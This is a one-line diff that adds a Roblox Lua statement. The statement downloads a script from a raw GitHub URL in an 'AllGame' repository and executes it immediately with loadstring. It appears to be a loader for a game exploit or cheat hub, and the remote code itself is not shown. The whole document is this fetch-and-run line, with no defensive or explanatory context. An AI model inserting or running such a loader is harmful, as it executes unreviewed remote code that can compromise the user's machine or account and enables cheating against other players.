@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CludeHub/AllGame/main/Local-Id-081726986551865381872552"))()
